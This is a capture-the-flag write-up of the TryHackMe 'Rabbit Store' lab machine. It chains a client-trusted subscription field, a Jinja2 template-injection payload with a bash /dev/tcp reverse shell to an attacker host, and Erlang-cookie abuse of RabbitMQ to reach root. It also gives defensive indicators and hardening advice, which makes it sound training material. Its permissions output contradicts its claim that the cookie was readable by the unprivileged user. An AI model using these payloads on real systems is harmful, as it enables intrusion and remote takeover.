---
layout: writeup
title: "Rabbit Store"
platform: THM
os: Linux
date: 2026-02-22
techniques: ["business logic flaw", "SSTI Jinja2", "RabbitMQ Erlang cookie abuse"]
description: "Business logic subscription bypass, Jinja2 SSTI for RCE, RabbitMQ Erlang cookie for privilege escalation."
---

# Rabbit Store - Technical Report

> **Platform:** TryHackMe \
> **Difficulty:** `Medium` \
> **Date:** 2026-02-22 \
> **Author:** 0N1S3C \
> **Scope:** Authorized TryHackMe lab environment only 

---

## 0. Executive Summary

The "Rabbit Store" machine was compromised via a multi-stage attack chain combining business logic flaws, server-side template injection, and message queue infrastructure abuse. An unauthenticated attacker could manipulate client-side parameters during registration to escalate account privileges, then exploit a Jinja2 Server-Side Template Injection (SSTI) vulnerability in a chatbot endpoint to achieve remote code execution as user `azrael`. Enumeration of the RabbitMQ backend revealed an exposed Erlang authentication cookie, which enabled administrative control of the message queue. Credential derivation analysis of RabbitMQ user password hashes ultimately yielded the Linux root password. Immediate remediation of server-side authorization controls, input sanitization in template rendering, and Erlang cookie permissions is strongly recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Rabbit Store"** machine on TryHackMe.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → Business Logic Flaw (subscription escalation) → SSTI (Jinja2 chatbot) → Shell as azrael → Exposed Erlang cookie → RabbitMQ admin access → Password hash extraction → Credential derivation → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `burpsuite` | Request interception & JSON manipulation |
| `nc` | Reverse shell listener |
| `epmd` | Erlang Port Mapper Daemon enumeration |
| `rabbitmqctl` / `rabbitmqadmin` | RabbitMQ administration |
| `python3` | Hash decoding & credential derivation |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV <target-ip>
nmap -T4 -n -sC -sV -Pn -p- <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu | Post-exploitation access |
| 80/tcp | HTTP | Apache 2.4.52 | Redirects to `cloudsite.thm` |
| 4369/tcp | EPMD | Erlang Port Mapper Daemon | Indicates Erlang/RabbitMQ infrastructure |
| 25672/tcp | Erlang Distribution | RabbitMQ inter-node communication | Backend message queue service |

**Key Observations:**
- HTTP service redirects to virtual host `cloudsite.thm` — added to `/etc/hosts`
- Erlang services detected (ports 4369, 25672) — RabbitMQ backend present
- Full port scan revealed message queue infrastructure running alongside web application

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, `burpsuite`, manual inspection

**Commands:**
```bash
gobuster dir -u http://cloudsite.thm -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**

| Subdomain | Path | Notes |
|-----------|------|-------|
| `cloudsite.thm` | `/` | Main landing page |
| `storage.cloudsite.thm` | `/` | Storage application — main attack surface |

**Storage Application Endpoints:**

| Method | Endpoint | Purpose |
|--------|----------|---------|
| POST | `/api/register` | User registration |
| POST | `/api/login` | Authentication |
| POST | `/api/upload` | File upload functionality |
| POST | `/api/store-url` | Store URL for processing |
| POST | `/api/fetch_messeges_from_chatbot` | Chatbot interaction (**vulnerable to SSTI**) |
| GET | `/api/uploads/<filename>` | Retrieve uploaded files |
| GET | `/dashboard/inactive` | Inactive user dashboard |
| GET | `/dashboard/active` | Active subscription dashboard |

**Authentication Mechanism:**
- JWT-based session cookies
- Token includes subscription status (`active` / `inactive`)

### 5.2 Erlang & RabbitMQ Services

**Tools Used:** `nmap`, `epmd`

**Commands:**
```bash
epmd -names
```

**Findings:**
- Erlang node name: `rabbit`
- RabbitMQ node detected via EPMD
- Backend message queue infrastructure confirmed

---

## 6. Initial Access

### 6.1 Vulnerability 1 — Business Logic Flaw in Registration

**Vulnerability:** Client-controlled subscription parameter trusted by server \
**Location:** `POST /api/register` \
**Reasoning:** The registration endpoint accepted a JSON body including a `"subscription"` field. The server-side logic trusted this client-supplied value without validation, allowing an attacker to self-assign an `"active"` subscription status during account creation.

**Exploitation:**

Intercepted registration request in Burp Suite and modified JSON payload:
```json
{
  "username": "attacker",
  "password": "password123",
  "subscription": "active"
}
```

**Result:** JWT issued with `"subscription": "active"` — gained access to `/dashboard/active` and additional API functionality.

### 6.2 Vulnerability 2 — Server-Side Template Injection (SSTI)

**Vulnerability:** Unsanitized user input rendered directly in Jinja2 template \
**Location:** `POST /api/fetch_messeges_from_chatbot` \
**Reasoning:** The chatbot endpoint accepted user messages and rendered them directly into a Jinja2 template without sanitization. This allowed arbitrary Python code execution via template syntax.

**Verification:**
```python
# Test payload
{{7*7}}
# Response: 49 (template evaluation confirmed)
```

**Exploitation — Remote Code Execution:**

Using Jinja2 object traversal to access Python's `os` module:
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Response: uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
```

**Reverse Shell Payload:**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"').read()}}
```

**Result:** Reverse shell obtained as user `azrael`.

---

## 7. Lateral Movement

Not applicable — initial access landed directly as `azrael`, the primary system user. Privilege escalation proceeded from this account to root.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l` — no sudo privileges
- [x] SUID binaries — nothing unusual
- [x] Running processes — RabbitMQ detected
- [x] Open ports — confirmed RabbitMQ listening internally
- [x] File permissions — searched for RabbitMQ configuration files

**Key Findings:**

**Erlang Cookie Discovery:**
```bash
find / -name ".erlang.cookie" 2>/dev/null
# /var/lib/rabbitmq/.erlang.cookie
```

**Permissions check:**
```bash
ls -la /var/lib/rabbitmq/.erlang.cookie
# -r-------- 1 rabbitmq rabbitmq 20 <date> /var/lib/rabbitmq/.erlang.cookie
```

**Critical vulnerability:** The `.erlang.cookie` file was readable by the `azrael` user — a severe trust boundary violation. This cookie functions as a shared secret for Erlang distributed node authentication.

### 8.2 Escalation Vector — RabbitMQ Administrative Access

**Vector:** Exposed Erlang authentication cookie → RabbitMQ admin control → credential derivation \
**Root Cause:** The Erlang cookie file, which should be restricted to the `rabbitmq` user only, was readable by `azrael`. This allowed full administrative authentication to the RabbitMQ node, enabling user enumeration, definition export, and password hash extraction.

**Step 1 — Authenticate to RabbitMQ Node:**

Using the exposed Erlang cookie, administrative commands could be executed:
```bash
rabbitmqctl list_users
# root   [administrator]
# guest  []
```

**Step 2 — Export RabbitMQ Definitions:**

RabbitMQ stores user credentials as:
```
Base64( Salt || SHA256(Salt || Password) )
```

Exported definitions contained the root user's password hash:
```bash
rabbitmqadmin export <output-file>
# Contains: "password_hash": "<base64_encoded_hash>"
```

**Step 3 — Decode Hash Structure:**

```python
import base64
hash_b64 = "<extracted_hash>"
decoded = base64.b64decode(hash_b64)

# Structure:
# Bytes 0-3:  4-byte salt
# Bytes 4-35: 32-byte SHA-256 digest
salt = decoded[:4]
digest = decoded[4:]
```

**Step 4 — Credential Derivation:**

The room provided a critical hint:
> "The Linux root password equals the SHA-256 hashed value of the RabbitMQ root user's password."

This meant:
```
Linux root password = hex(SHA256(RabbitMQ_password))
```

The digest extracted from the RabbitMQ hash represented `SHA256(salt + RabbitMQ_password)`. However, the hint indicated that the digest value itself (when converted to hex) was the system root password.

**Step 5 — Switch to Root:**

```bash
su root
# Password: <hex_digest_from_rabbitmq_hash>
```

**Result:** Root shell obtained. Root flag retrieved.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Business logic flaw — client-controlled subscription parameter | 🔴 Critical | `POST /api/register` |
| 2 | Server-Side Template Injection (SSTI) in chatbot endpoint | 🔴 Critical | `POST /api/fetch_messeges_from_chatbot` |
| 3 | Erlang cookie readable by unprivileged user | 🔴 Critical | `/var/lib/rabbitmq/.erlang.cookie` |
| 4 | RabbitMQ admin credentials exposed via definition export | 🔴 Critical | RabbitMQ management API |
| 5 | Credential derivation relationship between RabbitMQ and Linux root | 🟠 High | System design flaw |
| 6 | Insecure upload-by-URL implementation | 🟡 Medium | `/api/store-url` endpoint |
| 7 | Erlang distribution service exposed externally | 🟡 Medium | Port 25672 |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Abnormal JWT claims during user registration (`"subscription": "active"` for new accounts)
- Jinja2 template syntax in chatbot message requests (`{{`, `}}`, `__import__`, `popen`)
- Suspicious template rendering patterns in application logs
- Unexpected outbound connections from chatbot service to external IPs
- Erlang node CLI interactions from non-RabbitMQ user accounts
- `rabbitmqctl` or `rabbitmqadmin` execution outside of standard service management
- RabbitMQ definition export operations from unexpected source IPs
- `su root` authentication from `azrael` user in auth logs

### 10.2 Security Weaknesses

- Server-side logic trusts client-supplied `subscription` field without validation
- User input rendered directly in Jinja2 template without sanitization
- Erlang authentication cookie file has overly permissive read access
- RabbitMQ management API accessible to users with Erlang cookie knowledge
- Credential derivation creates a cryptographic link between application and system root passwords
- Upload-by-URL functionality could enable SSRF or malicious file injection
- Erlang distribution port exposed externally instead of localhost-only binding

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Enforce server-side authorization — never trust client-supplied role/subscription fields | Finding 1 |
| Immediate | Sanitize all user input before template rendering — use auto-escaping or safe template contexts | Finding 2 |
| Immediate | Restrict `.erlang.cookie` file permissions to `400` with `rabbitmq:rabbitmq` ownership | Finding 3 |
| Immediate | Rotate Erlang cookie and all RabbitMQ credentials | Finding 3, 4 |
| Immediate | Bind Erlang distribution to `localhost` only — restrict inter-node communication | Finding 7 |
| Short-term | Eliminate credential derivation relationships across services | Finding 5 |
| Short-term | Implement strict input validation and URL allowlisting for upload-by-URL feature | Finding 6 |
| Short-term | Deploy secrets management solution (Vault, AWS Secrets Manager) for credential storage | Finding 4 |
| Long-term | Regular security audits of business logic in API endpoints | Finding 1 |
| Long-term | Implement WAF rules to detect SSTI patterns in POST request bodies | Finding 2 |

---

## 11. Lessons Learned

- **Business logic flaws can be more impactful than cryptographic weaknesses** — the subscription parameter bypass was trivial to exploit but granted full application access. Client-side trust assumptions are a recurring vulnerability pattern in real applications.
- **SSTI testing with simple arithmetic is highly effective** — `{{7*7}}` immediately confirmed template injection. This should be a standard test for any endpoint that renders user-supplied content.
- **Full port scans reveal backend architecture** — ports 4369 and 25672 indicated RabbitMQ presence, which became the entire privilege escalation path. Never skip comprehensive port enumeration.
- **Message queue infrastructure can form unintended privilege bridges** — the Erlang cookie exposed by RabbitMQ created a direct path from web application user to system root. Backend services must be treated as part of the attack surface.
- **File permissions matter everywhere** — the `.erlang.cookie` file should have been `400 rabbitmq:rabbitmq`. One misconfigured permission check enabled full message queue compromise.
- **Credential derivation across services is dangerous** — linking the RabbitMQ password hash to the Linux root password created a single point of failure. Services should use independent, non-derivable credentials.
- **Structured enumeration prevents missed attack chains** — this box required chaining five distinct vulnerabilities. Methodical post-exploitation enumeration (processes, ports, file permissions, configuration files) was essential to discovering the full path.

---

*End of Report*
*Classification: Public — flags and sensitive values omitted*
